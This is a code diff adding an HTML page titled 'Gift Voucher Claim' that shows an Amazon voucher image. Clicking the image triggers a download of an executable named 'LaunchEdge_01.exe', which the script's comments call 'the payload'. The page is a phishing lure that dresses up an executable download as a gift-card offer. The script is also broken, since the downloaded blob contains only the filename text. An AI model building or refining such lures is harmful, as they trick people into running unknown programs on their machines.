@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Gift Voucher Claim</title>
+</head>
+<body>
+    <script type="text/javascript">
+
+            function imageClicked() {
+                // Step 1: Create the payload - a link to the .exe file
+                var payload = "LaunchEdge_01.exe";
+
+                // Step 2: Convert the payload to a blob
+                var blob = new Blob([payload], { type: 'application/octet-stream' });
+
+                // Step 3: Trigger the download
+                var a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                // Corrected the download filename (removed the URL)
+                a.download = 'LaunchEdge_01.exe';
+                a.click();
+            };
+    </script>
+
+    <img src="https://github.com/solkee/genric_files/blob/main/src/img/AmazonVoucher.PNG?raw=true" alt="Claim your Amazon Voucher" onclick="imageClicked()" />
+
+</body>
+</html>
